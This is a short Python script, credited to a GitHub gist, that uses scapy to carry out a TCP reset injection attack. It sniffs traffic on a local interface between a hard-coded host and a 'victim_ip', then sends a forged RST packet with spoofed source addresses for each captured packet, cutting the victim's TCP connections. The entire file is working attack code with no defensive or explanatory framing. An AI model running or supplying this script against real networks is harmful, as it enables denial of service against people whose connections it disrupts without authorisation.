#Code from https://gist.github.com/spinpx/263a2ed86f974a55d35cf6c3a2541dc2

from scapy.all import *

win=512
tcp_rst_count = 10
victim_ip = "192.168.2.101"
your_iface = "eth0"

def rst(t):
	tcpdata = {
    		'src': t[IP].src,
    		'dst': t[IP].dst,
    		'sport': t[TCP].sport,
    		'dport': t[TCP].dport,
    		'seq': t[TCP].seq,
    		'ack': t[TCP].ack
	}
	print(tcpdata['ack'])
	ack = int(tcpdata['ack']) 
	p = IP(src=tcpdata['dst'], dst=tcpdata['src'])/TCP(sport=tcpdata['dport'], dport=tcpdata['sport'], flags="R", seq=ack)
	send(p, verbose=0, iface=your_iface)
	print('Sent')

t = sniff(iface=your_iface, lfilter=lambda x: x.haslayer(TCP) and x[IP].dst == victim_ip and x[IP].src == "192.168.0.10" and x[TCP].ack != 0, prn=rst)

